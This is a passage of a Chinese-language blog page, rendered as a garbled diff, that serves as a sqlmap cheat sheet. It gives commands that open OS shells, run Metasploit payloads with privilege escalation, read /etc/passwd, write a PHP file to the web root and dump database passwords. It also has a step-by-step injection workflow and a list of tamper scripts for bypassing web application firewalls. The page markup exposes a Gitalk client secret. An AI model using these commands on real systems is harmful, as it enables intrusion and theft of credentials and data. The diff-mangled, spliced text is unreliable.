http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd <span class="string">&quot;id&quot;</span> -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=<span class="string">&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot;</span> --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</span> -p <span class="built_in">id</span> --prefix <span class="string">&quot;&#x27;)&quot;</span> --suffix <span class="string">&quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span></span><br><span class="line">16./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</span> --auth-type Basic --auth-cred <span class="string">&quot;testuser:testpass&quot;</span></span><br><span class="line">17./sqlmap.py -l burp.log --scope=<span class="string">&quot;(www)?\.target\.(com|net|org)&quot;</span></span><br><span class="line">18./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span> --sql-query <span class="string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v 1 </span><br><span class="line">20./sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;</span> --string=<span class="string">&#x27;xx&#x27;</span> --dbs --level=3 -p <span class="string">&quot;uid&quot;</span></span><br><span class="line"></span><br><span class="line">简单的注入流程 :</span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --<span class="built_in">users</span> --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T <span class="built_in">users</span> -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T <span class="built_in">users</span> -C <span class="string">&quot;username,password&quot;</span> -s <span class="string">&quot;sqlnmapdb.log&quot;</span> -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read <span class="string">&quot;/etc/passwd&quot;</span> -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试</span><br></pre></td></tr></table></figure>
 
 <h1 id="sqlmap-常用绕过脚本"><a href="#sqlmap-常用绕过脚本" class="headerlink" title="sqlmap 常用绕过脚本"></a>sqlmap 常用绕过脚本</h1><p>使用方法 <code>--tamper xxx.py</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py                         用UTF-8全角字符替换单引号字符</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py                   用非法双字节unicode字符替换单引号字符</span><br><span class="line"></span><br><span class="line">appendnullbyte.py                         在payload末尾添加空字符编码</span><br><span class="line"></span><br><span class="line">base64encode.py                           对给定的payload全部字符使用Base64编码</span><br><span class="line"></span><br><span class="line">between.py                                分别用“NOT BETWEEN 0 AND </span><br><span class="line"><span class="comment">#”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span></span><br><span class="line"></span><br><span class="line">bluecoat.py              在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class="line"></span><br><span class="line">chardoubleencode.py      对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line"></span><br><span class="line">charencode.py            对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line"></span><br><span class="line">charunicodeencode.py     对给定的payload的非编码字符使用Unicode 编码（不处理已经编码的字符）</span><br><span class="line"></span><br><span class="line">concat2concatws.py  用“CONCAT_WS(MID(CHAR(0), 0, 0), A,B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line"></span><br><span class="line">equaltolike.py          用“LIKE”运算符替换全部等于号“=”</span><br><span class="line"></span><br><span class="line">greatest.py             用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py         在每个关键字之前添加MySQL注释</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py                   用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line"></span><br><span class="line">lowercase.py                         用小写值替换每个关键字字符</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py              用注释包围完整的查询</span><br><span class="line"></span><br><span class="line">modsecurityzeroversioned.py          用当中带有数字零的注释包围完整的查询</span><br><span class="line"></span><br><span class="line">multiplespaces.py                    在SQL关键字周围添加多个空格</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py           用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line"></span><br><span class="line">overlongutf8.py                      转换给定的payload当中的所有字符</span><br><span class="line"></span><br><span class="line">percentage.py                        在每个字符之前添加一个百分号</span><br><span class="line"></span><br><span class="line">randomcase.py                        随机转换每个关键字字符的大小写</span><br><span class="line"></span><br><span class="line">randomcomments.py                    向SQL关键字中插入随机注释</span><br><span class="line"></span><br><span class="line">securesphere.py                      添加经过特殊构造的字符串</span><br><span class="line"></span><br><span class="line">sp_password.py向payload末尾添加“sp_password” <span class="keyword">for</span> automatic obfuscation from DBMS logs</span><br><span class="line"></span><br><span class="line">space2comment.py                     用“//”替换空格符**</span><br><span class="line"></span><br><span class="line">space2dash.py                     用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line"></span><br><span class="line">space2hash.py                     用磅注释符“<span class="comment">#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line"></span><br><span class="line">space2morehash.py                 用磅注释符“<span class="comment">#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line"></span><br><span class="line">space2mssqlblank.py               用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py                用磅注释符“<span class="comment">#”其次是一个换行符替换空格符</span></span><br><span class="line"></span><br><span class="line">space2mysqlblank.py               用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line"></span><br><span class="line">space2mysqldash.py                用破折号注释符“–”其次是一个换行符替换空格符</span><br><span class="line"></span><br><span class="line">space2plus.py                     用加号“+”替换空格符</span><br><span class="line"></span><br><span class="line">space2randomblank.py              用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line"></span><br><span class="line">unionalltounion.py                用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class="line"></span><br><span class="line">unmagicquotes.py                  用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line"></span><br><span class="line">varnish.py                        添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class="line"></span><br><span class="line">versionedkeywords.py              用MySQL注释包围每个非函数关键字</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py          用MySQL注释包围每个关键字</span><br><span class="line"></span><br><span class="line">xforwardedfor.py                  添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br></pre></td></tr></table></figure>
 
 
-  </div>
-  <div>    
-    <ul class="post-copyright">
-       <li class="post-copyright-link">
-        <strong>本文作者：</strong>
-        <a href="/">iahzl</a>
-      </li>
-      <li class="post-copyright-link">
-        <strong>本文标题：</strong>
-        <a href="{{ url_for(config.permalink) }}">
-    
-        <a class="" href="/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">sqlmap 常用指令</a>
-    
+                </div>
+
+                
+                        
+<div class="article-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="post-title border-box text-ellipsis">
+                sqlmap 常用指令
+            </div>
+
+            <div class="post-link border-box text-ellipsis">
+                sqlmap-常用指令/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">S3a</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2023-08-07 15:59</div>
+            </div>
 
 
-</a>
-      </li>
-      <li class="post-copyright-link">
-        <strong>本文链接：</strong>
-        <a title="sqlmap 常用指令">https://iahzl.github.io/sqlmap-常用指令/</a>
-      </li>
-      <li class="post-copyright-license">
-        <strong>版权声明： </strong>
-        本文由 iahzl 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" title="Attribution-NonCommercial-NoDerivatives 4.0 International" rel="license" target="_blank">CC BY-NC-ND 4.0</a>, 转载请保留以上声明信息！
-      </li>
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed">
+                        <i class="fa-brands fa-creative-commons"></i>
+                        <i class="fa-brands fa-creative-commons-by"></i>
+                        <i class="fa-brands fa-creative-commons-nc"></i>
+                        <i class="fa-brands fa-creative-commons-sa"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/sqlmap/">sqlmap</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
     </ul>
 </div>
-</article>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="article-nav">
+                        
+                            <div class="article-prev">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/Python-Homework-Checker/"
+                                   title="Python Homework Checker"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                      <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                            <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Python Homework Checker</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="article-next">
+                                <a class="next"
+                                   rel="next"
+                                   href="/%E4%BE%8B%E9%A2%98-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"
+                                   title="例题(手工注入)"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">例题(手工注入)</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                            <span class="right arrow-icon flex-center">
+                                      <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="valine-container">
+        <div id="vcomments"></div>
+        <script data-pjax
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script data-pjax
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: '7k3CLk60MtrFMwCeGukb3GQJ-gzGzoHsz',
+              appKey: 'qVXoRTYc2mDgd8leYtgZAeq2',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '',
+              lang: 'en'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
+            }
+          }
+
+          if ('true' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="nav-text">sqlmap 常用指令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E8%84%9A%E6%9C%AC"><span class="nav-text">sqlmap 常用绕过脚本</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box shields">
+        
+            <div class="info-item">
+                
+                <a class="shields-item">
+                    <img src="https://img.shields.io/badge/Since-2023_--_2023-dodgerblue?style=flat-square">
+                </a>
+                
+                    <a class="shields-item" href="/">
+                        <img src="https://img.shields.io/badge/WebMaster-S3a-dodgerblue?style=flat-square">
+                    </a>
+                
+                
+                <a class="shields-item" href="https://hexo.io" target="_blank">
+                    <img src="https://img.shields.io/badge/Powered_by-Hexo-dodgerblue?style=flat-square">
+                </a>
+                <a class="shields-item" href="https://github.com/XPoet/hexo-theme-keep" target="_blank">
+                    <img class="shields-keep-version" src="https://img.shields.io/badge/Theme-Keep-dodgerblue?style=flat-square">
+                </a>
+                
+            </div>
+            
+                <div class="info-item">
+                    
+                        
+                    
+                </div>
+            
+        
+
+        <div class="count-item info-item shields">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">Total words</span>
+                    <span class="item-value border-box word">32.4k</span>
+                </span>
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="nav-text">sqlmap 常用指令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E8%84%9A%E6%9C%AC"><span class="nav-text">sqlmap 常用绕过脚本</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/toggle-theme.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/lazyload.js"></script>
+
+
+<div class="pjax">
+    
+        <!-- post-helper -->
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/post/copyright-info.js"></script>
+        
+
+        <!-- share -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/post/share.js"></script>
+        
+    
+
+    <!-- category-page -->
+    
+
+    <!-- links-page -->
+    
+
+    <!-- photos-page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/libs/pjax.min.js"></script>
 <script>
-  function setClipboardText(event){
-      // clipboardData 对象是为通过编辑菜单、快捷菜单和快捷键执行的编辑操作所保留的，也就是你复制或者剪切内容
-      let clipboardData = event.clipboardData || window.clipboardData;
-      // 如果未复制或者未剪切，则return出去
-      if (!clipboardData) { return; }
-      event.preventDefault();
-      // Selection 对象，表示用户选择的文本范围或光标的当前位置。
-      //     声明一个变量接收 -- 用户输入的剪切或者复制的文本转化为字符串
-      let text = window.getSelection().toString();
-  
-      if (text) {
-          // 如果文本存在则先取消文本默认事件
-          event.preventDefault();
-          // 通过调用常clipboardData对象的 setData(format, data) 方法；来设置相关文本
-          // format: 一个DOMString 表示要添加到 drag object的拖动数据的类型。
-          // data: 一个 DOMString表示要添加到 drag object的数据。
-          var copyright = '\n\n'
-          + '——————————————————————'
-          + '\n版权声明：本文为「Ywj226」的原创文章，遵循CC BY-NC-ND 4.0版权协议，转载请附上原文出处链接及本声明。'
-          + '\n原文链接：https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/'
-  
-          clipboardData.setData('text/plain', text + copyright);
-  
-      }
-  };
-  var contents = document.getElementsByClassName("content");
-  // 监听文章内容的copy事件
-  contents[0].addEventListener('copy',function(e){
-      setClipboardText(e);
-  });
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
 </script>
 
 
 
 
-
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-    <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-    <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
-    <div id="gitalk-container"></div>
-    <script type="text/javascript">
-        var gitalk = new Gitalk({
-            clientID: 'a4d73b206590627d55c0',
-            clientSecret: '68744004f2191865ab4a5e6ee2eba67c673c6795',
-            id: md5(window.location.pathname),
-            repo: 'iahzl.github.io',
-            owner: 'iahzl',
-            admin: 'iahzl',
-            distractionFreeMode: ''
-        })
-        gitalk.render('gitalk-container')
-    </script>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">Home</a></li>
-        
-          <li><a href="/categories/">Categories</a></li>
-        
-          <li><a href="/tags/">Tags</a></li>
-        
-          <li><a href="/archives/">Writing</a></li>
-        
-          <li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li>
-        
-          <li><a href="/search/">Search</a></li>
-        
-          <li><a href="/about/">About</a></li>
-        
-      </ul>
-    </div>
-
     
+        
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">sqlmap 常用指令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap-%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E8%84%9A%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">sqlmap 常用绕过脚本</span></a></li></ol>
-      </div>
+        
+            
+<script class="custom-inject-js" src="/js/time.js" data-pjax></script>
+
+        
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&text=sqlmap 常用指令"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
